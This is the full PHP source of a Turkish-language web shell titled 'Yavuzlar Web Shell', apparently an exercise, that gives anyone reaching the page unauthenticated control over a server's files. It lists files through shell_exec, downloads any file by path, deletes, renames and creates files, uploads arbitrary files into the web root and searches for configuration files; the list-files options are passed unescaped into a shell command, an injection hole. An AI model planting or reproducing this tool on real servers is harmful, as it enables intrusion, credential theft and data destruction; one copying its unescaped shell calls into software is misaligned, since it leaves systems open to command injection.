<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Yavuzlar Shell</title>
</head>

<body>

    <center>
        <img src="navbar-logo.png" class="logo">
        <div class="title">Yavuzlar Web Shell</div>

        <table class="navbar">
            <tbody>
                <tr>
                    <td>
                        <a href="index.php?action=list-files">Dosyalar</a>
                        <a href="index.php?action=file-operations">Dosya Ekle</a>
                        <a href="index.php?action=search-files">Dosya Arama</a>
                        <a href="index.php?action=file-upload">Dosya Yükle</a>
                        <a href="index.php?action=find-config-files">Konfigürasyon Ara</a>
                    </td>
                </tr>
                <?php
                if (isset($_GET["action"]) && $_GET["action"] === "list-files") {
                    echo '<form method="GET" action="index.php">
                <tr>
                    <td><input type="checkbox" name="options[]" value="lh"> Dosya Boyutlarını Göster</td><br>
                    <td><input type="checkbox" name="options[]" value="a"> Gizli Klasörleri Göster</td><br>
                    <td><input type="checkbox" name="options[]" value="l"> İzinleri Göster</td><br>
                    <input type="text" name="action" value="list-files" hidden>
                    <td><input type="submit" value="Göster"></td>
                </tr>
                </form>';
                }
                ?>
            </tbody>
        </table>

        <?php
        if (isset($_GET["action"])) {
            $action = $_GET["action"];
            switch ($action) {
                case 'list-files':
                    if (isset($_GET["options"])) {
                        $options = $_GET["options"];
                        $parameters = "-";
                        foreach ($options as $option) {
                            $parameters .= $option;
                        }

                        echo "Kod: " . htmlspecialchars($parameters);

                        $output = shell_exec("ls " . $parameters);
                        $outputArray = explode("\n", trim($output));

                        if (count($outputArray) > 0) {
                            echo "<table><thead><tr><td>Dosyalar</td><td>İndir</td><td>Düzenle</td><td>Sil</td></tr></thead><tbody>";
                            foreach ($outputArray as $name) {
                                echo "<tr><td width=70%>" . htmlspecialchars($name) . "</td>
                                      <td><a href='index.php?action=download-file&file=" . urlencode($name) . "'>İndir</a></td>

                                      <td><button onclick=\"showRenameForm('" . htmlspecialchars($name) . "')\">Düzenle</button></td>
                                      <td><form method='POST' action='index.php?action=file-operations'>
                                          <input type='hidden' name='delete-file-name' value='" . htmlspecialchars($name) . "'>
                                          <input type='submit' value='Sil' onclick='return confirm(\"Bu dosyayı silmek istediğinizden emin misiniz?\")'>
                                      </form></td>
                                      </tr>";
                            }
                            echo "</tbody></table>";
                        } else {
                            echo "Dosya veya Klasör Bulunamadı.";
                        }
                    } else {
                        $output = shell_exec("ls");
                        $outputArray = explode("\n", trim($output));

                        if (count($outputArray) > 0) {
                            echo "<table><thead><tr><td>Dosyalar</td><td>İndir</td><td>Düzenle</td><td>Sil</td></tr></thead><tbody>";
                            foreach ($outputArray as $name) {
                                echo "<tr><td width=70%>" . htmlspecialchars($name) . "</td>
                                      <td><a href='index.php?action=download-file&file=" . urlencode($name) . "'>İndir</a></td>
                                      <td><button onclick=\"showRenameForm('" . htmlspecialchars($name) . "')\">Düzenle</button></td>
                                      <td><form method='POST' action='index.php?action=file-operations'>
                                          <input type='hidden' name='delete-file-name' value='" . htmlspecialchars($name) . "'>
                                          <input type='submit' value='Sil' onclick='return confirm(\"Bu dosyayı silmek istediğinizden emin misiniz?\")'>
                                      </form></td>
                                      </tr>";
                            }
                            echo "</tbody></table>";
                        } else {
                            echo "Dosya veya Klasör Bulunamadı.";
                        }
                    }
                    break;

                case 'download-file':
                    if (isset($_GET['file'])) {
                        $file = urldecode($_GET['file']);
                        $filePath = realpath($file);

                        if (file_exists($filePath)) {
                            header('Content-Description: File Transfer');
                            header('Content-Type: application/octet-stream');
                            header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
                            header('Content-Length: ' . filesize($filePath));
                            readfile($filePath);
                            exit;
                        } else {
                            echo "Dosya bulunamadı.";
                        }
                    }
                    break;


                case 'file-operations':
                    if (isset($_POST['delete-file-name'])) {
                        $fileToDelete = $_POST['delete-file-name'];

                        if (file_exists($fileToDelete)) {
                            unlink($fileToDelete);
                            echo $fileToDelete . " dosyası başarıyla silindi!";
                        } else {
                            echo "Dosya bulunamadı.";
                        }
                    }

                    if (isset($_POST['old-file-name']) && isset($_POST['new-file-name'])) {
                        $oldFileName = $_POST['old-file-name'];
                        $newFileName = $_POST['new-file-name'];

                        if (file_exists($oldFileName)) {
                            rename($oldFileName, $newFileName);
                            echo $oldFileName . " dosyasının adı başarıyla " . htmlspecialchars($newFileName) . " olarak değiştirildi!";
                        } else {
                            echo "Dosya bulunamadı.";
                        }
                    }

                    if (isset($_POST['file-name'])) {
                        $fileName = $_POST['file-name'];
                        file_put_contents($fileName, "Yeni dosya oluşturuldu.");
                        echo $fileName . " dosyası başarıyla oluşturuldu!";
                    }

                    echo '<form method="POST" action="index.php?action=file-operations">
                        Dosya Adı: <input type="text" name="file-name" required>
                        <input type="submit" value="Dosya Ekle">
                      </form>';

                    break;
                case 'search-files':
                    if (isset($_POST['search-file-name'])) {
                        $searchFileName = $_POST['search-file-name'];
                        $output = shell_exec("ls | grep " . escapeshellarg($searchFileName));
                        $outputArray = explode("\n", trim($output));

                        if (count($outputArray) > 0) {
                            echo "<table><thead><tr><td>Bulunan Dosyalar</td></tr></thead><tbody>";
                            foreach ($outputArray as $name) {
                                echo "<tr><td width=90%>" . htmlspecialchars($name) . "</td></tr>";
                            }
                            echo "</tbody></table>";
                        } else {
                            echo "Aranan dosya bulunamadı.";
                        }
                    }

                    echo '<form method="POST" action="index.php?action=search-files">
                            Aranacak Dosya Adı: <input type="text" name="search-file-name" required>
                            <input type="submit" value="Ara">
                          </form>';
                    break;
                case 'file-upload':
                    if (isset($_FILES['upload-file'])) {
                        $target_dir = "./"; 
                        $target_file = $target_dir . basename($_FILES["upload-file"]["name"]);

                        if (move_uploaded_file($_FILES["upload-file"]["tmp_name"], $target_file)) {
                            echo "Dosya başarıyla yüklendi: " . basename($_FILES["upload-file"]["name"]);
                        } else {
                            echo "Dosya yükleme başarısız oldu.";
                        }
                    }

                    echo '<form method="POST" enctype="multipart/form-data" action="index.php?action=file-upload">
                                <input type="file" name="upload-file">
                                <input type="submit" value="Dosya Yükle">
                              </form>';
                    break;
                case 'find-config-files':
                    $output = shell_exec('find . -type f \( -name "*.conf")');

                    if (!is_null($output)) {
                        $outputArray = explode("\n", trim($output));
                    } else {
                        $outputArray = [];
                    }

                    if (count($outputArray) > 0) {
                        echo "<table><thead><tr><td>Bulunan Konfigürasyon Dosyaları</td></tr></thead><tbody>";
                        foreach ($outputArray as $name) {
                            echo "<tr><td width=90%>" . htmlspecialchars($name) . "</td></tr>";
                        }
                        echo "</tbody></table>";
                    } else {
                        echo "Hiçbir konfigürasyon dosyası bulunamadı.";
                    }

                    break;
                default:
                    echo "Geçersiz işlem.";
                    break;
            }
        } else {
            echo "İlk olarak dosyaları listelemek için bir işlem seçin.";
        }
        ?>

        <script>
            function showRenameForm(oldFileName) {
                const formHtml = `
                <form method="POST" action="index.php?action=file-operations">
                    <input type="hidden" name="old-file-name" value="${oldFileName}">
                    Yeni Dosya Adı: <input type="text" name="new-file-name" required>
                    <input type="submit" value="Kaydet">
                    <button type="button" onclick="hideRenameForm()">Vazgeç</button>
                </form>
            `;
                document.getElementById('rename-form-container').innerHTML = formHtml;
            }

            function hideRenameForm() {
                document.getElementById('rename-form-container').innerHTML = '';
            }
        </script>

        <div id="rename-form-container"></div>
    </center>
</body>

</html>